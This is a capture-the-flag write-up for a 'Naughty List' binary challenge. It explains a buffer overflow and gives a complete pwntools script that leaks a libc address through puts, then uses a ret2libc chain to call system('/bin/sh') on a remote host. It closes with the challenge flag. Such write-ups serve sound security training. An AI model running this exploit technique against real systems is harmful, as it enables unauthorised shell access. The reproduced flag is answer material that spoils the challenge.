# Naughty List

## Challenge

Simple binary with a buffer-overflow.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

We can overflow the buffer and use `puts` to leak the libc address.

Then we can return to the vulnerable function and overflow a second time to ret2libc and spawn an shell.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 178.62.32.210 --port 30387 naughty_list
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('naughty_list')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '178.62.32.210'
port = int(args.PORT or 30387)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

rop = ROP(exe)

payload = flat({
    0x20 + 0x8: [
        rop.find_gadget(["pop rdi", "ret"])[0],
        exe.got["puts"],
        exe.plt["puts"],
        exe.sym["get_descr"],
        ],
    })

io.sendlineafter(b":", b"a")
io.sendlineafter(b":", b"a")
io.sendlineafter(b":", b"18")
io.sendlineafter(b":", payload)

io.recvuntil(b"\xf0\x9f\x8e\x81")
io.recvline()
libc.address = u64(io.recvline()[:-1].ljust(8, b'\x00')) - libc.sym["puts"]

io.sendlineafter(b":", payload)
log.success(hex(libc.address))

payload = flat({
    0x20 + 0x8: [
        rop.find_gadget(["ret"])[0],
        rop.find_gadget(["pop rdi", "ret"])[0],
        next(libc.search(b"/bin/sh")),
        libc.sym["system"],
        ],
    })

io.sendlineafter(b":", payload)

io.interactive()
```

## Flag

`HTB{u_w1ll_b3_n4ughtyf13d_1f_u_4r3_g3tt1ng_4_g1ft}`